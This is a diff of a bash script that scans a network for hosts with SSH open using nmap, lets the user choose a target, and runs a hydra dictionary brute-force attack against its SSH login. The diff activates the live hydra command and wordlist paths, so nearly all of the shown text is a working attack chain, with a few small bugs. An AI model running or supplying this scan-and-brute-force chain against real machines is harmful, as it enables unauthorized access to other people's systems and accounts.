@@ -31,17 +31,17 @@ do
 done
 
 #---------------------------------Scann the network------------------------------
-#rm scan 2> /dev/null
+#rm result/scanNetwork/scanSSH 2> /dev/null
 
 # -p 22 because 22 is the ssh port
 # -oX because we want a XML output file, it's easier to manipulate
 # for more information go to https://nmap.org/ or see nmap -h
-#nmap -p 22 $networkC --open -oX scan 
-echo "sudo nmap -p 22 $networkC -oX scan.xml --open"
+#nmap -p 22 $networkC --open -oX result/scanNetwork/scanSSH
+echo "sudo nmap -p 22 $networkC -oX --open"
 declare -a hostnamesArray
-hostnamesArray=($(xml_grep 'hostname' scan | grep "hostname" | cut -d '"' -f2))
-statesArray=($(xml_grep 'state' scan | grep "state" | cut -d '"' -f 6))
-addressArray=($(xml_grep 'address' scan | grep "address" | cut -d '"' -f2))
+hostnamesArray=($(xml_grep 'hostname' result/scanNetwork/scanSSH | grep "hostname" | cut -d '"' -f2))
+statesArray=($(xml_grep 'state' result/scanNetwork/scanSSH | grep "state" | cut -d '"' -f 6))
+addressArray=($(xml_grep 'address' result/scanNetwork/scanSSH | grep "address" | cut -d '"' -f2))
 
 #---------------------------------User select a target------------------------------
 ans="n"
@@ -73,7 +73,7 @@ do
 		else
 			colorS=$red
 		fi
-		echo -e "${hostnameArray[modJ]}" "state: "$colorS" "${statesArray[modJ]}$transparent
+		echo -e "${hostnamesArray[modJ]}" "state: "$colorS" "${statesArray[modJ]}$transparent
 		echo "|-> adress "${addressArray[modJ]}
 	done
 	
@@ -94,7 +94,7 @@ echo "Now if you know the username press y"
 echo -e "Now if you$red don't know$transparent the username press n"
 read ans
 if [ $ans = "n" ]; then
-	dicoArray=($(ls dico))
+	dicoArray=($(ls conf/dico))
 	if [ ${#dicoArray[@]} -gt 8 ]; then 
 		nDisplay=4
 	else
@@ -121,11 +121,11 @@ if [ $ans = "n" ]; then
 		k=$((($k+1)%${#dicoArray[@]}))
 		fi
 	done
-	username="dico/"${dicoArray[k]}
+	username=$PWD"/conf/dico/"${dicoArray[k]}
 	sed -i "1i${hostnamesArray[i]}" "$username"
 	echo "sed -i "1i${hostnamesArray[i]}" "$username""
 	bool="1"
-	username="-L "$username
+	username="-L '$username'"
 	
 	
 else
@@ -142,7 +142,7 @@ echo -e "Now if you$red don't know$transparent the password press n"
 read ans
 echo $ans
 if [ $ans = "n" ] ; then
-	dicoArray=($(ls dico))
+	dicoArray=($(ls conf/dico))
 	if [ ${#dicoArray[@]} -gt 8 ]; then 
 		nDisplay=4
 	else
@@ -169,8 +169,8 @@ if [ $ans = "n" ] ; then
 		p=$((($p+1)%${#dicoArray[@]}))
 		fi
 	done
-	password="dico/"${dicoArray[p]}
-	password="-P "${dicoArray[p]}
+	password=$PWD"/conf/dico/"${dicoArray[p]}
+	password="-P '$password'"
 	
 else
 	clear
@@ -182,13 +182,11 @@ fi
 echo $username
 echo $password
 
-	
-
-
-#hydra -s 22 -v -l pi -P /pathOfDico/ -e nsr -F 192.168.43.66 ssh
+echo hydra -s 22 -v $username $password -e nsr -F ${addressArray[i]} ssh -I
+hydra -s 22 -v $username $password -e nsr -F ${addressArray[i]} ssh -I
 # Supress the line we hadded in the user dictionnary
 if [ bool = '1' ]; then
-	sed -i '1d' "dico/${dicoArray[k]}"
+	sed -i '1d' "conf/dico/${dicoArray[k]}"
 fi
 
 	
